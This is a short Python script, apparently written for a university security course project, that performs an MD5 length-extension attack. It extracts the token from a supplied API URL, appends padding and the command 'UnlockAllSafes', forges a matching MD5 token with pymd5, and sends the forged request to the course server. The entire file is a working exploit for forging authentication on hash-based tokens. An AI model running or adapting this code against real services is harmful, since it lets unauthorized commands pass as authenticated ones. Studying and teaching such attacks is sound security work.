import httplib, urlparse, sys
from pymd5 import md5, padding
from urllib import quote

url = sys.argv[1]

restOfURL = url[75:]
givenToken = url[42:74]
toBeAdded = "&command3=UnlockAllSafes"
length_of_m = 8 + len(restOfURL)
padding = padding(8*length_of_m)
restOfURL = restOfURL + quote(padding) + toBeAdded
h = md5(state=givenToken.decode("hex"), count=512)
h.update(toBeAdded)
print restOfURL
print h.hexdigest()

finalURL = "https://comp427a.rice.edu/proj1/api?token=" + h.hexdigest() + "&" + restOfURL
print finalURL

parsedUrl = urlparse.urlparse(finalURL)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()